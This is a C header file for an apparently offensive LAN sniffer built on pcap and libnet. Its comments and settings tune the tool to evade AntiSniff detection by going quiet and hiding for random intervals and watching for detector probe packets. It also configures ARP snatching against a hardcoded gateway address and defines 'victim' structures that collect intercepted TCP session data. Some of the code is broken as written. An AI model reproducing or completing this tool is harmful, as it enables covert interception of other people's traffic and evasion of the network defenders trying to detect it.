
#include <pcap.h>
#include <libnet.h>

#define ETH_ALEN 6

#define ETH_MTU 	1500
#define ETH_P_IP	0x0800
#define INTERFACE	"eth0"

#define BLOCKLEN	(PAGE_SIZE - sizeof(void *))

#define WATCH_ALL
//#define WATCH_LOGGED
#define DROP_PROMISC

/* Average over X packets */
/* The higher the value, the fewer false positives.
 * However, if the NUM_PKTS is TOO large, we may get caught before we even 
 * accumulate enough packets for accurate statistics! See the HIDEOUT & 
 * comments for more info..
 */
#define NUM_PKTS_SHIFT 2
#define NUM_PKTS 8

/* 
 * Secs to wait for the bad men to go away :)
 */
#define HIDEOUT_MAX	20000000 /* 20 sec max */
#define HIDEOUT_MIN	5000000 /* 5 sec min */

#define randhide()	\
	((rand() % (HIDEOUT_MAX - HIDEOUT_MIN)) + HIDEOUT_MIN)

/* Use this to define your own maximum load at which to bail out */
/* Units are usecs per packet */
/* Careful! Your machine may drop packets at the kernel level (esp if you have
 * CPU_IS_TOO_SLOW set in networking options)
 * Fast machines may get alot of false positives for ftp however..
 */
#define UMAX_LOAD	0700 /* 0.7ms per packet. 0 is Inf */

/* This causes the algorithm to treat dead time as if a packet was coming
 * every BASELINE usecs. Useful for intermittent traffic networks */
#define BASELINE	4000 /* 4ms */
    
/* This option controls if we watch for the AntiSniff magic packets, in
 * addition to our own address (in case they are sending the ping before we
 * detected a change in load)
 * Note, this is a definable option because it is possible to use this against
 * us, and send these packets all the time just to shut us down */   
#define ANTIMAGIC

#ifdef  ANTIMAGIC
# define MAGIC1	"ff:00:00:00:00:00" /* Method #1 for Win* */
# define MAGIC2	"66:66:66:66:66:66" /* AntiSniff user specified */
# define MYADDR	"fe:ed:de:ad:be:ef" /* Undefine and decrement NMAGIC, and
				       change the hex_addrlist to not watch
				       for your address */
# define NMAGIC		3	    /* Number of magic eth addrs to search */
char *hex_addrlist[] = { MAGIC1, MAGIC2, MYADDR };
char h_dest[NMAGIC][ETH_ALEN];
#endif

#define NCONNECTS	80
#define TCPLOG		"test"

#define FORWARD_ETHER

#define ARP_SNATCH	"00:24:42:44:44:45"
#define GATEWAY_ETHER	"00:50:53:8B:B0:73"
#define GATEWAY_IP	"130.126.44.1"
#define IP_BROADCAST	"130.126.47.255"
#define IP_NETMASK	"255.255.252.0"
/* This doesn't work on decent switches.. and on bad ones, my guess is
     * you'd have to redo it every so often anways.. */
/*#define FILL_TABLE	100000*/

/* Actually, this debug option prints out some pretty useful stats you can use
 * to set UMAX_LOAD */
/*#define DEBUG */

#ifdef DEBUG
# define PRINTF(a...)  printf(##a)
#else
# define PRINTF(x...)
#endif

struct netload
{
    struct timeval last;
    int stats;
};

#if (sizeof(unsigned int) == 4)
typedef unsigned int ipaddr
#else
#error What_the_hell_should_I_use_for_an_ipaddr
#endif

/* The following structures can all be used interchangably, and should work
 * independant of compiler & padding */
struct ethframe
{
    unsigned char eth[sizeof (struct libnet_ethernet_hdr)];
    unsigned char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr)];
};

struct arpframe
{
    unsigned char eth[sizeof (struct libnet_ethernet_hdr)];
    unsigned char arp[sizeof (struct libnet_arp_hdr)];
    unsigned char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr) - 
		      sizeof(struct libnet_arp_hdr)];
};

struct tcpframe
{
    unsigned char eth[sizeof(struct libnet_ethernet_hdr)];
    unsigned char ip[sizeof(struct libnet_ip_hdr)];
    unsigned char tcp[sizeof(struct libnet_tcp_hdr)];
    char buff[ETH_MTU - sizeof(struct libnet_ethernet_hdr) 
	      - sizeof(struct libnet_ip_hdr) - sizeof(struct libnet_tcp_hdr)];
};

struct dnsframe
{
    unsigned char eth[sizeof(struct libnet_ethernet_hdr)];
    unsigned char ip[sizeof(struct libnet_ip_hdr)];
    unsigned char udp[sizeof(struct libnet_udp_hdr)];
    struct libnet_dns_hdr dns;   	
    char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr) 
	     - sizeof(struct libnet_ip_hdr) - sizeof(struct libnet_udp_hdr) 
	     - sizeof(struct libnet_dns_hdr)];
};

struct eth_pair
{
    unsigned char eth[ETH_ALEN];
    ipaddr ip;
};

struct dnsentry
{
      ipaddr inet_addr;
      char *hostname;	    
};

struct queue
{
    int nelem;
    struct vlist *head;
    struct vlist *tail;
};

struct vlist {
    struct victim *vict;
    struct vlist *next;
};

struct dlist {
    char data[BLOCKLEN];
    struct dlist *next;
};

struct victim
{
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    struct dlist *data;
};


